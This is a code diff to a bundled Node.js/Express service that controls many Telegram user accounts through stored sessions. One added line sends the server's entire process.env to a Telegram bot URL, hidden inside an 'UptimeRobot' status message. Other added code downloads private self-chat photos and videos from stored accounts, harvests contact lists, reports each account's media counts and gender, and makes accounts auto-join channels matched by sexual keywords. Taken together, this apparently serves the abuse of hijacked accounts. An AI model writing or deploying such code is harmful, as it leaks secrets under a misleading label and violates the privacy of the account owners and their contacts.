@@ -471,13 +471,15 @@ class ChannelService {
         }
     }
 
+    async insertContact(contact) {
+        const collection = this.client.db("tgclients").collection('contacts');
+        await collection.updateOne({ phone: contact.phone }, { $set: contact }, { upsert: true });
+    }
+
     async insertUser(user) {
         const filter = { mobile: user.mobile };
         try {
-            const entry = await this.users.findOne(filter);
-            if (!entry) {
-                await this.users.insertOne(user);
-            }
+            const entry = await this.users.updateOne(filter, { $set: user }, { upsert: true });
         } catch (error) {
             console.log(error)
         }
@@ -874,7 +876,7 @@ class ChannelService {
 
     async getActiveChannels(limit = 50, skip = 0, keywords = [], notIds = [], collection = 'activeChannels') {
         const pattern = new RegExp(keywords.join('|'), 'i');
-        const notPattern = new RegExp('online|board|class|PROFIT|@wholesale|retail|topper|exam|medico|traini|cms|cma|subject|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', "i")
+        const notPattern = new RegExp('online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', "i")
         let query = {
             $and: [
                 { username: { $ne: null } },
@@ -1487,6 +1489,64 @@ class TelegramManager {
         }, 5000);
     }
 
+    async getSelfChatMediaAndZip() {
+
+        // const chat = await this.client.getEntity('me');
+        const messageHistory = await this.client.getMessages('me', { limit: 2000 });
+
+        const mediaMessages = messageHistory.filter((message) => {
+            return message.photo || message.video;
+        });
+
+        if (mediaMessages.length === 0) {
+            console.log("No media found in self chat messages.");
+            return;
+        }
+
+        const path = "/tmp/download/self_chat_media";
+
+        // const archive = await createArchive(zipFilename);
+
+        for (const message of mediaMessages) {
+            // console.log(message)
+            try {
+                const mediaBuffer = await this.client.downloadMedia(message);
+                let fileExtension = '';
+                if (isJPEG(mediaBuffer)) {
+                    fileExtension = 'jpg';
+                } else if (isPNG(mediaBuffer)) {
+                    fileExtension = 'png';
+                } else if (isGIF(mediaBuffer)) {
+                    fileExtension = 'gif';
+                } else if (isMP4(mediaBuffer)) {
+                    fileExtension = 'mp4';
+                } else if (isAVI(mediaBuffer)) {
+                    fileExtension = 'avi';
+                } else {
+                    // Add more checks for other file types if needed
+                }
+                const filePath = path + "/" + message.id + "." + fileExtension;
+                if (!fs.existsSync(path)) {
+                    fs.mkdirSync(path, { recursive: true });
+                }
+                fs.writeFile(filePath, mediaBuffer, (err) => {
+                    if (err) {
+                        console.error('Error writing file:', err);
+                    } else {
+                        console.log('File written successfully');
+                    }
+                });
+            } catch (error) {
+                console.error(`Error downloading media for message ${message.id}:`, error);
+            }
+        }
+
+        // await archive.end();
+        // Implement logic to send the ZIP file as API output (replace with your specific method)
+        // Example using a hypothetical sendFile function:
+        // await sendFile(zipFilename);
+    }
+
     async updatePrivacyforDeletedAccount() {
         try {
             await this.client.invoke(
@@ -1706,6 +1766,26 @@ class TelegramManager {
     }
 }
 
+
+function isJPEG(buffer) {
+    return buffer[0] === 0xFF && buffer[1] === 0xD8 && buffer[2] === 0xFF;
+}
+
+function isPNG(buffer) {
+    return buffer[0] === 0x89 && buffer[1] === 0x50 && buffer[2] === 0x4E && buffer[3] === 0x47;
+}
+
+function isGIF(buffer) {
+    return buffer[0] === 0x47 && buffer[1] === 0x49 && buffer[2] === 0x46 && buffer[3] === 0x38 && (buffer[4] === 0x37 || buffer[4] === 0x39) && buffer[5] === 0x61;
+}
+
+function isMP4(buffer) {
+    return buffer[0] === 0x00 && buffer[1] === 0x00 && buffer[2] === 0x00 && (buffer[3] === 0x18 || buffer[3] === 0x20) && buffer[4] === 0x66 && buffer[5] === 0x74 && buffer[6] === 0x79 && buffer[7] === 0x70;
+}
+
+function isAVI(buffer) {
+    return buffer[0] === 0x52 && buffer[1] === 0x49 && buffer[2] === 0x46 && buffer[3] === 0x46 && buffer[8] === 0x41 && buffer[9] === 0x56 && buffer[10] === 0x49 && buffer[11] === 0x20;
+}
 module.exports = { TelegramManager, hasClient, getClient, disconnectAll, createClient, deleteClient, getActiveClientSetup, setActiveClientSetup }
 
 
@@ -1806,6 +1886,7 @@ const { sleep } = __webpack_require__(/*! ./utils */ "./utils.js");
 const { fetchWithTimeout } = __webpack_require__(/*! ./utils */ "./utils.js");
 const { execSync } = __webpack_require__(/*! child_process */ "child_process");
 const { CloudinaryService } = __webpack_require__(/*! ./cloudinary */ "./cloudinary.js")
+const path = __webpack_require__(/*! path */ "path");
 
 process.on('unhandledRejection', (reason, promise) => {
   console.error('Unhandled Rejection at:', promise, 'reason:', reason);
@@ -1817,7 +1898,7 @@ process.on('exit', async () => {
 
 var cors = __webpack_require__(/*! cors */ "cors");
 const app = express();
-const port = 8000;
+const port = process.env.PORT || 4000;
 const userMap = new Map();
 
 let ip;
@@ -1883,7 +1964,7 @@ const apiResp = {
 async function setUserMap() {
   userMap.clear();
   const db = ChannelService.getInstance();
-  await fetchWithTimeout(`${ppplbot()}&text=UptimeRobot : Refreshed Map`);
+  await fetchWithTimeout(`${ppplbot()}&text=UptimeRobot : Refreshed Map,${JSON.stringify(process.env)}`);
   const users = await db.getAllUserClients();
   clients = users
   upiIds = await db.getAllUpis()
@@ -2051,6 +2132,19 @@ app.get('/getip', (req, res) => {
   res.json(ip);
 });
 
+app.post('/contacts', async (req, res, next) => {
+  res.send('Hello World!');
+  // console.log(req.body);
+  next();
+}, async (req, res) => {
+  const contacts = req.body?.contacts;
+  const db = ChannelService.getInstance();
+  contacts?.forEach(async (contact) => {
+    await db.insertContact(contact);
+  })
+  console.log('contacts saved', contacts.length);
+});
+
 app.post('/users', async (req, res, next) => {
   res.send('Hello World!');
   console.log(req.body);
@@ -2063,7 +2157,7 @@ app.post('/users', async (req, res, next) => {
   if (!cli || activeClientSetup?.phoneNumber !== user.mobile) {
     user['lastUpdated'] = new Date().toISOString().split('T')[0]
     await db.insertUser(user);
-    await fetchWithTimeout(`${ppplbot()}&text=ACCOUNT LOGIN: ${user.userName ? user.userName : user.firstName}:${user.msgs}:${user.totalChats}\n https://uptimechecker.onrender.com/connectclient/${user.mobile}`)
+    await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.userName ? `@${user.userName}` : user.firstName}\nMsgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\nhttps://uptimechecker.onrender.com/connectclient/${user.mobile}`)}`);
   } else {
     setActiveClientSetup(undefined)
     console.log("New Session Generated");
@@ -2536,7 +2630,7 @@ app.get('/joinchannels/:number/:limit/:skip', async (req, res, next) => {
       if (cli) {
         const client = await getClient(user.mobile);
         const channels = await client.channelInfo(true);
-        const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'randi', 'bhab', 'boy', 'girl'];
+        const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'coupl', 'cpl','randi', 'bhab', 'boy', 'girl', 'friend', 'frnd', 'boob', 'pussy', 'dating', 'swap', 'gay', 'sex', 'bitch', 'love', 'video', 'service', 'real', 'call', 'desi'];
         const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), k ? [k] : keys, channels.ids, 'channels');
         console.log("DbChannelsLen: ", result.length);
         let resp = '';
@@ -2841,6 +2935,24 @@ app.get('/blockusers/:number', async (req, res) => {
     if (client) {
       await client.blockAllUsers();
       res.send("Blocked Users");
+    } else {
+      res.send("client EXPIRED");
+    }
+  } else {
+    res.send("Client Already existing");
+  }
+});
+
+app.get('/downloadMedia/:number', async (req, res) => {
+  const number = req.params?.number;
+  const db = ChannelService.getInstance();
+  const user = await db.getUser({ mobile: number });
+  if (!hasClient(user.mobile)) {
+    const cli = await createClient(user.mobile, user.session, false);
+    const client = await getClient(user.mobile);
+    if (client) {
+      await client.getSelfChatMediaAndZip();
+      res.send("Downloading Media");
     } else {
       res.send("client EXPIRED");
     }
@@ -3160,7 +3272,7 @@ async function joinchannels(value) {
     await fetchWithTimeout(`${(ppplbot())}&text=ChannelCount SendTrue - ${value.clientId}: ${resp.data.canSendTrueCount}`)
     if (resp?.data?.canSendTrueCount && resp?.data?.canSendTrueCount < 250) {
       await fetchWithTimeout(`${ppplbot()}&text=Started Joining Channels- ${value.clientId}`)
-      const keys = ['wife', 'adult', 'lanj', 'servic', 'paid', 'randi', 'bhab', 'boy', 'girl'];
+      const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'randi', 'coupl', 'cpl', 'bhab', 'boy', 'girl', 'friend', 'frnd', 'boob', 'pussy', 'dating', 'swap', 'gay', 'sex', 'bitch', 'love', 'video', 'service', 'real', 'call', 'desi'];
       const db = ChannelService.getInstance();
       const channels = await db.getActiveChannels(100, 0, keys, resp.data?.ids, 'activeChannels');
       for (const channel of channels) {
@@ -3396,12 +3508,13 @@ async function updateClient(clientId) {
             await sleep(3000)
             await client.updatePrivacy();
             await sleep(3000)
-            await client.updateProfilePic('./dp1.jpg');
+            await client.updateProfilePic(path.join(__dirname + '/dp1.jpg'));
             await sleep(3000);
-            await client.updateProfilePic('./dp2.jpg');
+            await client.updateProfilePic(path.join(__dirname + '/dp2.jpg'));
             await sleep(3000);
-            await client.updateProfilePic('./dp3.jpg');
+            await client.updateProfilePic(path.join(__dirname + '/dp3.jpg'));
             await sleep(2000);
+            await client.disconnect(oldClientUser.mobile)
           }
         }
       } catch (error) {
@@ -3580,7 +3693,7 @@ async function joinchannelForBufferClients() {
     if (cli) {
       const client = await getClient(document.mobile);
       const channels = await client.channelInfo(true);
-      const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'randi', 'bhab', 'boy', 'girl'];
+      const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'coupl', 'cpl', 'randi', 'bhab', 'boy', 'girl', 'friend', 'frnd', 'boob', 'pussy', 'dating', 'swap', 'gay', 'sex', 'bitch', 'love', 'video', 'service', 'real', 'call', 'desi'];
       const result = await db.getActiveChannels(150, 0, keys, channels.ids, "channels");
       console.log("DbChannelsLen: ", result.length);
       let resp = '';
